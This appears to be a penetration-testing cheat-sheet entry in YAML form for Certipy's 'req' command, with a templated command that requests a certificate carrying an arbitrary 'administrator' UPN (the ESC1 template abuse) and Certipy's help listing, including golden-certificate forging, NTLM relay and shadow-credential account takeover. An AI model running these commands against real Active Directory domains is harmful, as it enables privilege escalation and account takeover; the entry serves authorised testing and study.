---
description: |
  Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS). The req command is useful for requesting, retrieving, and renewing certificates. Which is useful for exploiting serveral certifacte templating vulnerabilities like ESC1, ESC2, etc.

  Command Reference:
  
  	Username: <user>

  	Password: <passwd>

    arbitrary UPN: <administrator>

    Domain: <domain.local>

    DC: <dc01.domain.local>

    CA: <DC01-CA>

command: |
  certipy req -username <user>@<domain.local> -password <passwd> -ca <DC01-CA> -target <dc01.domain.local> -template newMaus -upn <administrator>@<domain.local> -dns <dc01.domain.local>

code: |
    positional arguments:
    {account,auth,ca,cert,find,forge,ptt,relay,req,shadow,template}
                        Action
    account             Manage user and machine accounts
    auth                Authenticate using certificates
    ca                  Manage CA and certificates
    cert                Manage certificates and private keys
    find                Enumerate AD CS
    forge               Create Golden Certificates
    ptt                 Inject TGT for SSPI authentication
    relay               NTLM Relay to AD CS HTTP Endpoints
    req                 Request certificates
    shadow              Abuse Shadow Credentials for account takeover
    template            Manage certificate templates 

items:
  - Username
  - Password
services:
  - LDAP
  - ADCS
OS:
  - Windows
  - Approved-tool
attack_types:
  - Enumeration
references:
  - https://github.com/ly4k/Certipy
---